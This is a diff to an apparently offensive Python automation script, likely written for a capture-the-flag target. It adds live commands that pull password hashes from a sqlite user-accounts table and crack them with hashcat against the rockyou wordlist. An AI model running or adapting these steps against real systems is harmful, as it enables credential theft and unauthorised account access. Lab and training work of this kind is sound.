@@ -8,7 +8,7 @@ import subprocess
 import time
 import pexpect
 import paramiko
-
+import os
 
 
 
@@ -106,11 +106,12 @@ def DownloadZip(username, passZip):
 
 	subprocess.Popen(["7z","x","1_*",f"-p{passZip}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-#	command = "sqlite3 db.sqlite3 --line 'select * from accounts_customuser' | grep 'password' | awk 'NF{print $NF}' > hashes"
+	time.sleep(1)
 
-#	args = ["bash", "-c", command]
+	os.system("sqlite3 db.sqlite3 --line 'select * from accounts_customuser' | grep 'password' | awk 'NF{print $NF}' > hashes")
 
-#	process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	os.system("hashcat --quiet -a 0 -m 124 hashes /usr/share/wordlists/rockyou.txt -o hash")
+
 
 
 
